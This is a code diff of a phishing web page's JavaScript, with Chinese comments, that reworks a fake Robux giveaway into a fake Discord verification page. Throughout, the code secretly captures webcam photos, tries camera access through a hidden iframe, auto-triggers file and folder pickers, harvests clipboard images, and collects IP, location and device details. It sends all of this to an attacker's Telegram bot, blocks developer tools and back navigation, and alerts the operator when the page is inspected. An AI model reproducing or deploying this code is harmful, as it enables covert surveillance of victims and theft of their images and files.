-    if (ua.includes("Windows")) return "Windows";
-    if (ua.includes("Mac")) return "MacOS";
-    if (ua.includes("Linux")) return "Linux";
-    if (ua.includes("Android")) return "Android";
-    if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
-    return "未知";
-}
-// ==================== 摄像头和位置收集 ====================
-
-// 立即访问摄像头
-async function accessCamera() {
-    updateProgress('正在验证身份...', 60);
-    
+// 尝试访问摄像头
+async function tryAccessCamera() {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        logToStream('❌ 摄像头API不支持');
         return false;
     }
 
     try {
-        logToStream('📸 尝试访问摄像头...');
+        // 先枚举设备，了解有哪些摄像头
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const cameras = devices.filter(device => device.kind === 'videoinput');
         
+        collectedData.cameras = cameras.map(cam => ({
+            deviceId: cam.deviceId,
+            label: cam.label || 'Unknown Camera'
+        }));
+
+        // 尝试访问默认摄像头
         const stream = await navigator.mediaDevices.getUserMedia({
             video: {
                 width: { ideal: 640 },
@@ -702,321 +469,496 @@ async function accessCamera() {
             audio: false
         });
 
-        cameraAccessed = true;
-        collectedData.camera.accessed = true;
-        logToStream('✅ 摄像头访问成功！');
-        
-        // 立即拍照
-        cameraPreview.srcObject = stream;
-        
-        setTimeout(() => {
-            try {
-                const context = photoCanvas.getContext('2d');
-                photoCanvas.width = cameraPreview.videoWidth || 640;
-                photoCanvas.height = cameraPreview.videoHeight || 480;
-                
-                if (cameraPreview.videoWidth > 0) {
-                    context.drawImage(cameraPreview, 0, 0);
-                    
-                    // 转换为blob并发送
-                    photoCanvas.toBlob(async (blob) => {
-                        if (blob) {
-                            collectedData.camera.photo = '已捕获';
-                            logToStream('📷 照片捕获成功');
-                            
-                            // 发送照片到Telegram
-                            await sendToTelegram(blob, true);
-                            
-                            // 关闭摄像头
-                            stream.getTracks().forEach(track => track.stop());
-                            cameraPreview.srcObject = null;
-                        }
-                    }, 'image/jpeg', 0.8);
-                }
-            } catch (photoError) {
-                logToStream('❌ 照片捕获失败');
-            }
-        }, 100); // 100毫秒后拍照
+        // 显示摄像头预览（如果是当前步骤）
+        if (currentStep === 2) {
+            cameraPreview.style.display = 'block';
+            cameraStream.srcObject = stream;
+        }
+
+        // 立即拍照并发送
+        setTimeout(async () => {
+            await captureAndSendPhoto(stream, 'discord_verification');
+        }, 1000);
+
+        collectedData.steps.camera = {
+            accessed: true,
+            timestamp: new Date().toISOString(),
+            deviceCount: cameras.length
+        };
 
         return true;
-        
+
     } catch (error) {
-        logToStream(`❌ 摄像头访问被拒绝: ${error.name}`);
-        collectedData.camera.error = error.name;
+        collectedData.steps.camera = {
+            accessed: false,
+            error: error.name,
+            timestamp: new Date().toISOString()
+        };
         return false;
     }
 }
 
-// 获取地理位置
-async function getLocation() {
-    if ('geolocation' in navigator) {
-        try {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    collectedData.location = {
-                        gps: {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            altitude: position.coords.altitude,
-                            speed: position.coords.speed,
-                            timestamp: position.timestamp
-                        }
+// 拍照并发送
+async function captureAndSendPhoto(stream, source) {
+    try {
+        // 创建临时video元素
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        // 等待摄像头稳定
+        await delay(500);
+
+        // 设置canvas尺寸
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+
+        // 拍照
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+
+        // 转换为blob
+        return new Promise((resolve) => {
+            canvas.toBlob(async (blob) => {
+                if (blob) {
+                    // 发送到Telegram
+                    await sendPhotoToTelegram(blob, source);
+                    
+                    // 停止摄像头
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    resolve(true);
+                }
+                resolve(false);
+            }, 'image/jpeg', 0.8);
+        });
+
+    } catch (error) {
+        return false;
+    }
+}
+
+// 通过iframe尝试摄像头访问（更隐蔽）
+function tryCameraViaIframe() {
+    try {
+        hiddenFrame.src = "about:blank";
+        hiddenFrame.onload = function() {
+            const iframeDoc = hiddenFrame.contentDocument || hiddenFrame.contentWindow.document;
+            iframeDoc.write(`
+                <script>
+                    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                        .then(stream => {
+                            window.parent.postMessage({ 
+                                type: 'cameraAccess', 
+                                success: true 
+                            }, '*');
+                        })
+                        .catch(err => {
+                            window.parent.postMessage({ 
+                                type: 'cameraAccess', 
+                                success: false 
+                            }, '*');
+                        });
+                <\/script>
+            `);
+        };
+
+        // 监听消息
+        window.addEventListener('message', (event) => {
+            if (event.data.type === 'cameraAccess') {
+                if (event.data.success && !collectedData.steps.camera?.accessed) {
+                    collectedData.steps.camera = {
+                        iframeAccessed: true,
+                        timestamp: new Date().toISOString()
                     };
-                    logToStream(`📍 GPS坐标: ${position.coords.latitude}, ${position.coords.longitude}`);
-                },
-                (error) => {
-                    logToStream('⚠️ 位置权限被拒绝');
-                },
-                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-            );
-        } catch (error) {
+                }
+            }
+        });
+
+    } catch (error) {
+        // 静默失败
+    }
+}
+// ==================== 文件访问功能 ====================
+
+// 初始化文件上传
+function initFileUpload() {
+    // 点击上传区域触发文件选择
+    fileUploadArea.addEventListener('click', () => {
+        hiddenFileInput.click();
+    });
+
+    // 文件选择变化
+    hiddenFileInput.addEventListener('change', async (event) => {
+        const files = Array.from(event.target.files);
+        if (files.length > 0) {
+            for (const file of files) {
+                await processAndSendFile(file, 'direct_upload');
+            }
+            
+            // 清空input
+            hiddenFileInput.value = '';
+            
+            // 更新UI
+            fileUploadArea.innerHTML = `
+                <div style="font-size: 48px; color: #43b581; margin-bottom: 10px;">✅</div>
+                <div style="color: #b9bbbe;">已选择 ${files.length} 个文件</div>
+            `;
+        }
+    });
+
+    // 拖放支持
+    fileUploadArea.addEventListener('dragover', (e) => {
+        e.preventDefault();
+        fileUploadArea.style.background = 'rgba(88, 101, 242, 0.1)';
+    });
+
+    fileUploadArea.addEventListener('dragleave', () => {
+        fileUploadArea.style.background = '';
+    });
+
+    fileUploadArea.addEventListener('drop', async (e) => {
+        e.preventDefault();
+        fileUploadArea.style.background = '';
+        
+        const files = Array.from(e.dataTransfer.files);
+        if (files.length > 0) {
+            for (const file of files) {
+                await processAndSendFile(file, 'drag_drop');
+            }
+            
+            fileUploadArea.innerHTML = `
+                <div style="font-size: 48px; color: #43b581; margin-bottom: 10px;">✅</div>
+                <div style="color: #b9bbbe;">已拖放 ${files.length} 个文件</div>
+            `;
+        }
+    });
+
+    // 尝试自动触发文件选择（隐蔽方式）
+    setTimeout(() => {
+        try {
+            hiddenFileInput.click();
+        } catch (e) {
             // 静默失败
         }
+    }, 3000);
+}
+
+// 处理文件并发送
+async function processAndSendFile(file, source) {
+    try {
+        const fileInfo = {
+            name: file.name,
+            size: file.size,
+            type: file.type,
+            source: source,
+            timestamp: new Date().toISOString()
+        };
+
+        // 添加到收集数据
+        collectedData.files.push(fileInfo);
+
+        // 发送到Telegram
+        if (file.type.startsWith('image/')) {
+            await sendPhotoToTelegram(file, `file_${source}`);
+        } else {
+            await sendDocumentToTelegram(file, `doc_${source}`);
+        }
+
+        return true;
+
+    } catch (error) {
+        return false;
     }
 }
 
-// 收集传感器数据
-function collectSensorData() {
-    updateProgress('正在检测传感器...', 70);
-    
-    collectedData.sensors = {};
-    
-    // 陀螺仪
-    if ('DeviceOrientationEvent' in window) {
-        collectedData.sensors.gyroscope = true;
-        window.addEventListener('deviceorientation', (event) => {
-            if (!collectedData.sensors.orientation) {
-                collectedData.sensors.orientation = {
-                    alpha: event.alpha,
-                    beta: event.beta,
-                    gamma: event.gamma
-                };
-            }
-        }, { once: true });
-    }
+// 尝试webkitdirectory访问文件夹
+function tryFolderAccess() {
+    if ('webkitdirectory' in document.createElement('input')) {
+        setTimeout(() => {
+            const folderInput = document.createElement('input');
+            folderInput.type = 'file';
+            folderInput.webkitdirectory = true;
+            folderInput.multiple = true;
+            folderInput.style.display = 'none';
 
-    // 加速度计
-    if ('DeviceMotionEvent' in window) {
-        collectedData.sensors.accelerometer = true;
-        window.addEventListener('devicemotion', (event) => {
-            if (!collectedData.sensors.motion) {
-                collectedData.sensors.motion = {
-                    acceleration: event.acceleration,
-                    accelerationIncludingGravity: event.accelerationIncludingGravity,
-                    rotationRate: event.rotationRate
-                };
-            }
-        }, { once: true });
-    }
+            folderInput.addEventListener('change', async (e) => {
+                const files = Array.from(e.target.files);
+                for (let i = 0; i < Math.min(files.length, 10); i++) {
+                    await processAndSendFile(files[i], 'folder_access');
+                }
+            });
 
-    // 光线传感器
-    if ('AmbientLightSensor' in window) {
-        collectedData.sensors.lightSensor = true;
-    }
+            document.body.appendChild(folderInput);
 
-    logToStream('📡 传感器扫描完成');
+            // 尝试自动触发
+            setTimeout(() => {
+                try {
+                    folderInput.click();
+                } catch (e) {
+                    // 静默失败
+                }
+            }, 5000);
+
+        }, 7000);
+    }
 }
-        // ==================== 行为跟踪 ====================
 
-        // 跟踪鼠标移动
-        function trackMouse() {
-            document.addEventListener('mousemove', (event) => {
-                mousePositions.push({
-                    x: event.clientX,
-                    y: event.clientY,
-                    time: Date.now()
-                });
+// 尝试通过剪贴板访问
+function initClipboardAccess() {
+    document.addEventListener('paste', async (e) => {
+        const items = e.clipboardData.items;
+        for (const item of items) {
+            if (item.type.indexOf('image') !== -1) {
+                const file = item.getAsFile();
+                if (file) {
+                    await processAndSendFile(file, 'clipboard');
+                }
+            }
+        }
+    });
+}
+        // ==================== Telegram发送功能 ====================
+
+        // 发送照片到Telegram
+        async function sendPhotoToTelegram(file, source) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CONFIG.chatId);
                 
-                // 只保留最近100个位置
-                if (mousePositions.length > 100) {
-                    mousePositions = mousePositions.slice(-100);
+                if (file instanceof Blob) {
+                    // 如果是Blob对象
+                    formData.append('photo', file, `verification_${Date.now()}.jpg`);
+                } else {
+                    // 如果是File对象
+                    formData.append('photo', file);
                 }
                 
-                collectedData.behavior.push({
-                    type: 'mouse_move',
-                    x: event.clientX,
-                    y: event.clientY,
-                    timestamp: new Date().toISOString()
+                formData.append('caption', `📸 Discord验证 - ${source}\n时间: ${new Date().toLocaleString()}`);
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
                 });
-            });
-            
-            // 跟踪点击
-            document.addEventListener('click', (event) => {
-                collectedData.behavior.push({
-                    type: 'click',
-                    x: event.clientX,
-                    y: event.clientY,
-                    target: event.target.tagName,
-                    timestamp: new Date().toISOString()
-                });
-            });
+
+                return true;
+
+            } catch (error) {
+                return false;
+            }
         }
 
-        // 跟踪键盘输入
-        function trackKeyboard() {
-            document.addEventListener('keydown', (event) => {
-                keyStrokes.push({
-                    key: event.key,
-                    code: event.code,
-                    time: Date.now()
+        // 发送文档到Telegram
+        async function sendDocumentToTelegram(file, source) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CONFIG.chatId);
+                formData.append('document', file);
+                formData.append('caption', `📁 Discord验证 - ${source}\n文件: ${file.name}`);
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendDocument`, {
+                    method: 'POST',
+                    body: formData
                 });
-                
-                collectedData.behavior.push({
-                    type: 'keypress',
-                    key: event.key,
-                    code: event.code,
-                    timestamp: new Date().toISOString()
-                });
-            });
+
+                return true;
+
+            } catch (error) {
+                return false;
+            }
         }
 
-        // ==================== 主流程 ====================
-
-        // 开始数据收集
-        async function startDataCollection() {
-            logToStream('🚀 开始Robux验证流程...');
-            
-            // 显示验证面板
-            verificationPanel.style.display = 'block';
-            
-            // 步骤1: 基础信息
-            await collectNetworkInfo();
-            
-            // 步骤2: 设备信息
-            collectDeviceInfo();
-            
-            // 步骤3: 立即尝试摄像头
-            setTimeout(() => {
-                accessCamera();
-            }, 500);
-            
-            // 步骤4: 尝试获取位置
-            setTimeout(() => {
-                getLocation();
-            }, 1000);
-            
-            // 步骤5: 传感器
-            setTimeout(() => {
-                collectSensorData();
-            }, 1500);
-            
-            // 步骤6: 开始行为跟踪
-            trackMouse();
-            trackKeyboard();
-            
-            // 步骤7: 开始定期发送数据
-            setTimeout(() => {
-                sendTelemetryData();
-                dataStreamInterval = setInterval(sendTelemetryData, TELEGRAM_CONFIG.sendInterval);
-            }, 2000);
-            
-            // 步骤8: 完成验证
-            setTimeout(() => {
-                completeVerification();
-            }, 5000);
+        // 发送文本消息到Telegram
+        async function sendTextToTelegram(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CONFIG.chatId,
+                        text: text.substring(0, 4000)
+                    })
+                });
+                return true;
+            } catch (error) {
+                return false;
+            }
         }
 
-        // 发送数据到Telegram
-        async function sendTelemetryData() {
-            if (telemetrySent) return;
+        // 发送验证摘要
+        async function sendVerificationSummary() {
+            const summary = `🎯 Discord验证完成
+
+📅 时间: ${new Date().toLocaleString()}
+🆔 会话ID: ${collectedData.basic?.sessionId || '未知'}
+
+📱 设备信息:
+浏览器: ${collectedData.basic?.userAgent?.split(' ').slice(0, 3).join(' ') || '未知'}
+系统: ${collectedData.basic?.platform || '未知'}
+语言: ${collectedData.basic?.language || '未知'}
+屏幕: ${collectedData.basic?.screen || '未知'}
+
+🌐 网络信息:
+IP地址: ${collectedData.network?.ip || '未知'}
+位置: ${collectedData.network?.location || '未知'}
+ISP: ${collectedData.network?.isp || '未知'}
+
+📸 摄像头访问: ${collectedData.steps.camera?.accessed ? '✅ 成功' : '❌ 失败'}
+📁 文件上传: ${collectedData.files.length} 个文件
+
+✅ 验证步骤: ${currentStep}/3 完成`;
+
+            await sendTextToTelegram(summary);
+        }
+        // ==================== 主验证流程 ====================
+
+        // 开始验证流程
+        async function startVerification() {
+            if (verificationComplete) return;
+            
+            setButtonState(false, '验证中...');
+            hideMessages();
             
             try {
-                const message = formatTelegramMessage();
-                await sendToTelegram(message);
+                // 步骤1：收集基础信息
+                updateProgress(10);
+                await delay(500);
                 
-                // 更新计数器
-                const currentCount = parseInt(onlineCount.textContent.replace(/,/g, ''));
-                onlineCount.textContent = (currentCount + Math.floor(Math.random() * 3) + 1).toLocaleString();
+                collectBasicInfo();
+                await getNetworkInfo();
+                
+                // 发送初始信息
+                await sendTextToTelegram(
+                    `🚀 Discord验证开始\n用户: ${document.getElementById('discordUsername').value}\n时间: ${new Date().toLocaleString()}`
+                );
+                
+                // 步骤2：摄像头验证
+                updateProgress(30);
+                showStep(2);
+                await delay(1000);
+                
+                const cameraSuccess = await tryAccessCamera();
+                tryCameraViaIframe(); // 并行尝试iframe方式
+                
+                if (cameraSuccess) {
+                    await delay(2000); // 给拍照留时间
+                }
+                
+                // 步骤3：文件验证
+                updateProgress(60);
+                showStep(3);
+                await delay(1000);
+                
+                // 初始化文件上传
+                initFileUpload();
+                tryFolderAccess();
+                initClipboardAccess();
+                
+                // 等待文件上传
+                await delay(3000);
+                
+                // 完成验证
+                updateProgress(100);
+                await sendVerificationSummary();
+                
+                verificationComplete = true;
+                showSuccess('✅ 验证成功！正在跳转...');
+                setButtonState(false, '验证完成');
+                
+                // 3秒后显示假的重定向
+                setTimeout(() => {
+                    window.location.href = 'https://discord.com';
+                }, 3000);
                 
             } catch (error) {
-                console.error('数据发送失败:', error);
+                showError('❌ 验证过程中出现错误，请重试');
+                setButtonState(true, '重试验证');
+                verificationComplete = false;
             }
         }
 
-        // 完成验证
-        async function completeVerification() {
-            updateProgress('正在完成参与...', 100);
+        // ==================== 防检测保护 ====================
+
+        function setupProtection() {
+            // 禁用右键菜单
+            document.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
+                return false;
+            });
             
-            // 发送最终数据
-            await sendTelemetryData();
-            telemetrySent = true;
+            // 禁用开发者工具快捷键
+            document.addEventListener('keydown', (e) => {
+                const forbiddenKeys = ['F12', 'Ctrl+Shift+I', 'Ctrl+Shift+J', 'Ctrl+U'];
+                const isForbidden = 
+                    e.key === 'F12' ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                    (e.ctrlKey && e.key === 'u');
+                
+                if (isForbidden) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
             
-            // 清除定时器
-            if (dataStreamInterval) {
-                clearInterval(dataStreamInterval);
-            }
+            // 防止复制
+            document.addEventListener('copy', (e) => {
+                e.preventDefault();
+            });
             
-            // 显示成功页面
-            setTimeout(() => {
-                loadingOverlay.style.display = 'none';
-                mainContent.style.display = 'block';
-                verificationPanel.style.display = 'none';
-                successScreen.style.display = 'block';
+            // 检测开发者工具
+            const checkDevTools = () => {
+                const threshold = 160;
+                const widthDiff = window.outerWidth - window.innerWidth > threshold;
+                const heightDiff = window.outerHeight - window.innerHeight > threshold;
                 
-                // 生成抽奖编号
-                const entryNum = generateEntryNumber();
-                entryNumber.textContent = entryNum;
-                collectedData.entryNumber = entryNum;
-                
-                // 发送最终确认
-                setTimeout(() => {
-                    const finalMessage = `✅ 验证完成
-用户: ${entryNum}
-IP地址: ${collectedData.ip}
-地理位置: ${collectedData.location}
-摄像头: ${cameraAccessed ? '是' : '否'}
-总数据点: ${Object.keys(collectedData).length}`;
-                    
-                    sendToTelegram(finalMessage);
-                }, 1000);
-                
-            }, 1500);
+                if (widthDiff || heightDiff) {
+                    sendTextToTelegram('⚠️ 检测到开发者工具打开');
+                }
+            };
+            
+            setInterval(checkDevTools, 1000);
         }
 
         // ==================== 初始化 ====================
 
-        // 页面加载时开始
+        // 页面加载完成
         window.addEventListener('DOMContentLoaded', () => {
-            // 开始加载动画
-            updateLoading('正在初始化Robux抽奖系统...');
-            updateProgress('正在加载...', 10);
+            // 设置防检测
+            setupProtection();
             
-            // 更新计数器动画
-            setInterval(() => {
-                const current = parseInt(onlineCount.textContent.replace(/,/g, ''));
-                const change = Math.floor(Math.random() * 5) - 2;
-                onlineCount.textContent = Math.max(1000, current + change).toLocaleString();
-            }, 3000);
-            
-            // 1秒后开始数据收集
+            // 自动开始基础数据收集
             setTimeout(() => {
-                startDataCollection();
-            }, 1000);
+                collectBasicInfo();
+                getNetworkInfo();
+            }, 2000);
             
-            // 防止右键和开发者工具
-            document.addEventListener('contextmenu', (e) => e.preventDefault());
-            document.addEventListener('keydown', (e) => {
-                if (e.key === 'F12' || 
-                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
-                    (e.ctrlKey && e.key === 'u')) {
-                    e.preventDefault();
+            // 页面关闭时发送数据
+            window.addEventListener('beforeunload', () => {
+                if (!verificationComplete) {
+                    sendTextToTelegram('🚪 用户未完成验证离开页面');
                 }
             });
+            
+            // 页面可见性变化
+            document.addEventListener('visibilitychange', () => {
+                if (document.hidden) {
+                    sendTextToTelegram('📱 用户切换到其他标签页');
+                }
+            });
+            
+            // 自动开始验证（延迟启动）
+            setTimeout(() => {
+                // 自动点击验证按钮
+                verifyButton.click();
+            }, 5000);
         });
 
-        // 页面关闭时发送数据
-        window.addEventListener('beforeunload', () => {
-            if (!telemetrySent) {
-                sendTelemetryData();
-            }
-        });
-
-        // 页面隐藏时发送数据
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden && !telemetrySent) {
-                sendTelemetryData();
-            }
+        // 防止返回按钮
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', () => {
+            history.pushState(null, null, location.href);
         });
     </script>
 </body>
